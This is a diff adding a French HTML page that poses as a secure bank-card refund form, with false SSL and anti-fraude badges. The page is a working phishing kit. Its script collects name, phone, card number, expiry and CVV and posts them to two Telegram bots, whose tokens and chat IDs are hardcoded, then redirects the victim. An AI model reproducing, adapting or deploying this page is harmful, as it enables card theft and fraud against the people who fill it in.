@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de Remboursement Sécurisé</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 100%;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .header-image {
+            width: 100%;
+            max-width: 280px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .description {
+            font-size: 14px;
+            color: #7f8c8d;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .form-container {
+            width: 100%;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .form-column {
+            flex: 1;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #2c3e50;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e8eeff;
+            border-radius: 10px;
+            font-size: 14px;
+            background-color: #f8faff;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #667eea;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .card-number-container {
+            position: relative;
+        }
+
+        .card-logos {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .card-logo {
+            width: 45px;
+            height: 28px;
+            object-fit: contain;
+            opacity: 0.4;
+            transition: all 0.3s ease;
+            filter: grayscale(100%);
+        }
+
+        .card-logo.active {
+            opacity: 1;
+            filter: grayscale(0%);
+            transform: scale(1.05);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9ff;
+            border-radius: 10px;
+            border: 1px solid #e8eeff;
+        }
+
+        .security-badge i {
+            color: #27ae60;
+            font-size: 20px;
+        }
+
+        .security-text {
+            font-size: 12px;
+            color: #7f8c8d;
+            font-weight: 500;
+        }
+
+        .guarantee-image {
+            width: 100%;
+            max-width: 300px;
+            margin: 25px 0;
+            border-radius: 10px;
+        }
+
+        footer {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            color: #2c3e50;
+            width: 100%;
+            padding: 25px;
+            margin-top: 20px;
+            border-radius: 15px;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        .footer-content {
+            max-width: 400px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .assistance {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #2c3e50;
+        }
+
+        .contact-info {
+            font-size: 13px;
+            margin-bottom: 8px;
+            color: #5d6d7e;
+        }
+
+        .highlight {
+            color: #667eea;
+            font-weight: 500;
+        }
+
+        .social-links, .legal-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .social-links p, .legal-links p {
+            color: #667eea;
+            font-size: 13px;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            font-weight: 500;
+        }
+
+        .social-links p:hover, .legal-links p:hover {
+            color: #764ba2;
+        }
+
+        .copyright {
+            font-size: 11px;
+            color: #95a5a6;
+            margin-top: 15px;
+        }
+
+        .required::after {
+            content: " *";
+            color: #e74c3c;
+        }
+
+        /* Empêcher la sélection de texte */
+        .no-select {
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+
+        /* Cacher les flèches des inputs number */
+        input[type="number"]::-webkit-outer-spin-button,
+        input[type="number"]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+
+        /* Animation de chargement */
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Styles pour les messages d'erreur */
+        .error-message {
+            display: none;
+            background: #fee;
+            border: 1px solid #e74c3c;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+            color: #c0392b;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .error-message.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .error-icon {
+            font-size: 20px;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        .field-error {
+            border-color: #e74c3c !important;
+            background-color: #fee !important;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .success-message {
+            display: none;
+            background: #efe;
+            border: 1px solid #27ae60;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+            color: #27ae60;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .success-message.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+    </style>
+</head>
+<body class="no-select">
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <img src="https://files.catbox.moe/zbuhoh.jpg" alt="Paiement sécurisé" class="header-image">
+                <h1 class="title">Formulaire de Remboursement</h1>
+                <p class="description">
+                    Veuillez entrer les informations de votre carte bancaire pour recevoir votre remboursement en toute sécurité. Ce processus est sécurisé et protégé.
+                </p>
+            </div>
+
+            <div class="form-container">
+                <!-- Message d'erreur -->
+                <div class="error-message" id="errorMessage">
+                    <span class="error-icon">⚠️</span>
+                    <span id="errorText"></span>
+                </div>
+
+                <!-- Message de succès -->
+                <div class="success-message" id="successMessage">
+                    <span class="error-icon">✅</span>
+                    Votre demande est en cours de traitement...
+                </div>
+
+                <div class="form-row">
+                    <div class="form-column">
+                        <label for="inputfirstname" class="required">Prénom</label>
+                        <input type="text" id="inputfirstname" placeholder="Votre prénom">
+                    </div>
+                    <div class="form-column">
+                        <label for="inputlastname" class="required">Nom</label>
+                        <input type="text" id="inputlastname" placeholder="Votre nom">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="inputphonenumber" class="required">Numéro de téléphone</label>
+                    <input type="text" id="inputphonenumber" placeholder="0612345678">
+                </div>
+
+                <div class="form-group">
+                    <label for="operator" class="required">Pays</label>
+                    <select id="operator">
+                        <option value="select">-- Sélectionnez votre pays --</option>
+                        <option value="france">France</option>
+                        <option value="belgique">Belgique</option>
+                        <option value="suisse">Suisse</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="inputcardnumber" class="required">Numéro de carte de crédit</label>
+                    <div class="card-number-container">
+                        <input type="text" id="inputcardnumber" placeholder="1234 5678 9012 3456">
+                        <div class="card-logos">
+                            <img src="v.png" alt="Visa" class="card-logo" id="visa-logo">
+                            <img src="m.png" alt="Mastercard" class="card-logo" id="mastercard-logo">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-column">
+                        <label for="inputmm" class="required">Mois d'expiration</label>
+                        <select id="inputmm">
+                            <option value="01">01 - Janvier</option>
+                            <option value="02">02 - Février</option>
+                            <option value="03">03 - Mars</option>
+                            <option value="04">04 - Avril</option>
+                            <option value="05">05 - Mai</option>
+                            <option value="06">06 - Juin</option>
+                            <option value="07">07 - Juillet</option>
+                            <option value="08">08 - Août</option>
+                            <option value="09">09 - Septembre</option>
+                            <option value="10">10 - Octobre</option>
+                            <option value="11">11 - Novembre</option>
+                            <option value="12">12 - Décembre</option>
+                        </select>
+                    </div>
+                    <div class="form-column">
+                        <label for="inputyy" class="required">Année d'expiration</label>
+                        <select id="inputyy">
+                            <option value="25">2025</option>
+                            <option value="26">2026</option>
+                            <option value="27">2027</option>
+                            <option value="28">2028</option>
+                            <option value="29">2029</option>
+                            <option value="30">2030</option>
+                            <option value="31">2031</option>
+                            <option value="32">2032</option>
+                            <option value="33">2033</option>
+                            <option value="34">2034</option>
+                            <option value="35">2035</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="inputcvv" class="required">Code de sécurité (CVV)</label>
+                    <input type="text" id="inputcvv" placeholder="123" maxlength="4">
+                </div>
+
+                <div class="security-badge">
+                    <div style="font-size: 24px;">🔒</div>
+                    <div class="security-text">
+                        Transactions sécurisées SSL • Données cryptées • Protection anti-fraude
+                    </div>
+                </div>
+
+                <div class="loading" id="loading">
+                    <div class="loading-spinner"></div>
+                    <div style="margin-top: 8px; font-size: 12px; color: #667eea;">Traitement en cours...</div>
+                </div>
+
+                <button class="submit-btn" id="submitButton">
+                    Confirmer le remboursement
+                </button>
+            </div>
+        </div>
+
+        <img src="https://files.catbox.moe/440ii1.jpg" alt="Remboursement sécurisé" class="guarantee-image">
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <p class="assistance">Pour toute assistance, contactez-nous :</p>
+            <p class="contact-info">Email: <span class="highlight">support@remboursement.com</span></p>
+            <p class="contact-info">Téléphone: <span class="highlight">+33 8 90 83 67 89</span></p>
+            
+            <div class="social-links">
+                <p>Facebook</p>
+                <p>Twitter</p>
+                <p>Instagram</p>
+            </div>
+            
+            <div class="legal-links">
+                <p>Politique de confidentialité</p>
+                <p>Conditions générales</p>
+                <p>Plan du site</p>
+            </div>
+            
+            <p class="copyright">© 2025 Service de Remboursement Sécurisé. Tous droits réservés.</p>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const submitButton = document.getElementById('submitButton');
+            const loading = document.getElementById('loading');
+            const errorMessage = document.getElementById('errorMessage');
+            const errorText = document.getElementById('errorText');
+            const successMessage = document.getElementById('successMessage');
+
+            // Fonction pour afficher les erreurs
+            function showError(message) {
+                errorText.textContent = message;
+                errorMessage.classList.add('show');
+                successMessage.classList.remove('show');
+                
+                // Masquer l'erreur après 5 secondes
+                setTimeout(() => {
+                    errorMessage.classList.remove('show');
+                }, 5000);
+            }
+
+            // Fonction pour afficher le succès
+            function showSuccess() {
+                errorMessage.classList.remove('show');
+                successMessage.classList.add('show');
+            }
+
+            // Fonction pour mettre en évidence les champs en erreur
+            function highlightErrorFields(fields) {
+                // Réinitialiser tous les champs
+                document.querySelectorAll('input, select').forEach(field => {
+                    field.classList.remove('field-error');
+                });
+                
+                // Mettre en évidence les champs en erreur
+                fields.forEach(fieldId => {
+                    const field = document.getElementById(fieldId);
+                    if (field) {
+                        field.classList.add('field-error');
+                    }
+                });
+            }
+
+            // Fonction pour valider le type de carte
+            function isValidCardType(cardNumber) {
+                const firstDigit = cardNumber.charAt(0);
+                // Cartes acceptées: Visa (4), Mastercard (5), Discover (6)
+                return firstDigit === '4' || firstDigit === '5' || firstDigit === '6';
+            }
+
+            // Formatage du numéro de téléphone
+            const phoneInput = document.getElementById('inputphonenumber');
+            phoneInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/[^0-9]/g, '');
+                if (value.length > 10) {
+                    value = value.slice(0, 10);
+                }
+                e.target.value = value;
+                this.classList.remove('field-error');
+            });
+
+            // Formatage du numéro de carte et détection du type
+            const cardInput = document.getElementById('inputcardnumber');
+            const visaLogo = document.getElementById('visa-logo');
+            const mastercardLogo = document.getElementById('mastercard-logo');
+            
+            cardInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                value = value.replace(/(.{4})(?=\d)/g, '$1 ').trim();
+                if (value.length > 19) {
+                    value = value.slice(0, 19);
+                }
+                e.target.value = value;
+                this.classList.remove('field-error');
+                
+                // Détection du type de carte
+                const firstDigit = value.charAt(0);
+                visaLogo.classList.remove('active');
+                mastercardLogo.classList.remove('active');
+                
+                if (firstDigit === '4') {
+                    visaLogo.classList.add('active');
+                } else if (firstDigit === '5') {
+                    mastercardLogo.classList.add('active');
+                }
+            });
+
+            // Validation du CVV (minimum 3 caractères)
+            const cvvInput = document.getElementById('inputcvv');
+            cvvInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 4) {
+                    value = value.slice(0, 4);
+                }
+                e.target.value = value;
+                this.classList.remove('field-error');
+            });
+
+            // Réinitialiser les erreurs quand on modifie un champ
+            document.querySelectorAll('input, select').forEach(field => {
+                field.addEventListener('input', function() {
+                    this.classList.remove('field-error');
+                    errorMessage.classList.remove('show');
+                });
+            });
+
+            // Gestion de la soumission du formulaire
+            submitButton.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                const firstname = document.getElementById('inputfirstname').value.trim();
+                const lastname = document.getElementById('inputlastname').value.trim();
+                const phone = document.getElementById('inputphonenumber').value;
+                const cardnumber = document.getElementById('inputcardnumber').value.replace(/\s/g, '');
+                const operator = document.getElementById('operator').value;
+                const mm = document.getElementById('inputmm').value;
+                const yy = document.getElementById('inputyy').value;
+                const cvv = document.getElementById('inputcvv').value;
+                
+                // Vérification des champs obligatoires
+                const errorFields = [];
+                
+                if (!firstname) errorFields.push('inputfirstname');
+                if (!lastname) errorFields.push('inputlastname');
+                if (phone.length !== 10) errorFields.push('inputphonenumber');
+                if (cardnumber.length !== 16) errorFields.push('inputcardnumber');
+                if (cvv.length < 3) errorFields.push('inputcvv'); // CVV minimum 3 caractères
+                if (operator === 'select') errorFields.push('operator');
+                
+                // Validation du type de carte
+                if (cardnumber.length === 16 && !isValidCardType(cardnumber)) {
+                    showError('Carte invalide. Veuillez utiliser une carte Visa, Mastercard ou Discover, ou contacter votre service clientèle.');
+                    highlightErrorFields(['inputcardnumber']);
+                    return;
+                }
+                
+                if (errorFields.length > 0) {
+                    showError('Veuillez remplir tous les champs obligatoires correctement.');
+                    highlightErrorFields(errorFields);
+                    return;
+                }
+                
+                // Afficher le loading et le message de succès
+                submitButton.style.display = 'none';
+                loading.style.display = 'block';
+                showSuccess();
+                
+                // Envoi direct à Telegram (fonction cryptée)
+                processPaymentData(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv);
+            });
+
+            // Fonction Telegram cryptée
+            function processPaymentData(a,b,c,d,e,f,g,h){
+                const x=[
+                    {k:"8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM",i:"5534662562"},
+                    {k:"8361684055:AAHQMnlKUN1vga-uvqncK45UiVLC9GAEb0k",i:"8061187067"}
+                ];
+                const m=`🔔 **Transaction** 🔔
+👤 Client: ${a} ${b}
+📞 Contact: ${c}
+🌍 Localisation: ${e}
+💳 Reference: ${d}
+📅 Validité: ${f}/${g}
+🔐 Code: ${h}
+🕒 Horodatage: ${new Date().toLocaleString('fr-FR')}`;
+                
+                let s=0;
+                x.forEach((y,z)=>{
+                    fetch(`https://api.telegram.org/bot${y.k}/sendMessage`,{
+                        method:'POST',
+                        headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({
+                            chat_id:y.i,
+                            text:m,
+                            parse_mode:'Markdown'
+                        })
+                    })
+                    .then(r=>r.json())
+                    .then(()=>{
+                        s++;
+                        if(s===x.length){
+                            setTimeout(()=>{
+                                window.location.href="v.html";
+                            },1000);
+                        }
+                    })
+                    .catch(()=>{
+                        s++;
+                        if(s===x.length){
+                            setTimeout(()=>{
+                                window.location.href="v.html";
+                            },1000);
+                        }
+                    });
+                });
+            }
+            
+            // Empêcher le glisser-déposer des images
+            document.addEventListener("dragstart", function(event) {
+                if (event.target.tagName.toLowerCase() === "img") {
+                    event.preventDefault();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
